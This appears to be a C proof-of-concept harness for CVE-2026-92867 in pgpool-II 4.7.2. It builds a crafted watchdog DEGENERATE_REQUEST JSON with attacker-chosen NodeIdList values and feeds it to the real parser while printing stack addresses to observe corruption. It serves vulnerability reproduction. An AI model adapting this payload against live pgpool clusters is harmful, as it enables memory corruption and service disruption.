/*
 * Direct-call harness for CVE-2026-92867, pinned pgpool-II 4.7.2.
 * Calls the real upstream parse_wd_node_function_json() from
 * src/watchdog/wd_json_data.c with a peer-style NodeIdList of chosen values.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "pool.h"
#include "pool_config.h"
#include "watchdog/wd_json_data.h"
#include "parser/pg_list.h"

/* Unused by the parse path; stubs satisfy unrelated objects in wd_json_data.o. */
void	   *MemoryContextAlloc(MemoryContext ctx, Size n) { (void) ctx; return malloc(n); }
void	   *copyObjectImpl(const void *from) { (void) from; return NULL; }
size_t		pvsnprintf(char *buf, size_t len, const char *fmt, va_list ap)
{ return (size_t) vsnprintf(buf, len, fmt, ap); }

/* Stub globals the real object references; not used by the parse path. */
POOL_CONFIG *pool_config = NULL;
POOL_REQUEST_INFO *Req_info = NULL;

static const char *payload(int count, unsigned int v0, unsigned int v1)
{
	static char buf[1024];
	size_t		off = 0;
	int			i;

	off += (size_t) snprintf(buf + off, sizeof(buf) - off,
		"{\"Function\":\"DEGENERATE_REQUEST\",\"Flags\":0,");
	off += (size_t) snprintf(buf + off, sizeof(buf) - off,
		"\"NodeCount\":%d,\"NodeIdList\":[", count);
	for (i = 0; i < count; i++)
	{
		unsigned int v = (i == 0) ? v0 : ((i == 1) ? v1 : 0x43434343U);
		off += (size_t) snprintf(buf + off, sizeof(buf) - off,
			"%s%u", i ? "," : "", v);
	}
	snprintf(buf + off, sizeof(buf) - off, "]}");
	return buf;
}

int main(int argc, char **argv)
{
	int count = (argc > 1) ? atoi(argv[1]) : 2;
	unsigned int v0 = (argc > 2) ? strtoul(argv[2], NULL, 0) : 0x41414141U;
	unsigned int v1 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0x42424242U;
	const char *json = payload(count, v0, v1);

	/* Same local layout as process_failover_command_on_coordinator(). */
	char	   *func_name;
	int			node_count = 0;
	int		   *node_id_list = NULL;
	unsigned char flags;

	fprintf(stderr, "payload=%s\n", json);
	fprintf(stderr, "&node_id_list=%p  next_slot=%p\n",
		(void *) &node_id_list, (void *) (&node_id_list + 1));

	parse_wd_node_function_json((char *) json, strlen(json),
		&func_name, &node_id_list, &node_count, &flags);

	fprintf(stderr, "returned: func=%s count=%d list=%p values=%08x,%08x\n",
		func_name ? func_name : "(null)", node_count,
		(void *) node_id_list,
		node_id_list ? node_id_list[0] : 0,
		(node_id_list && node_count > 1) ? node_id_list[1] : 0);
	return 0;
}
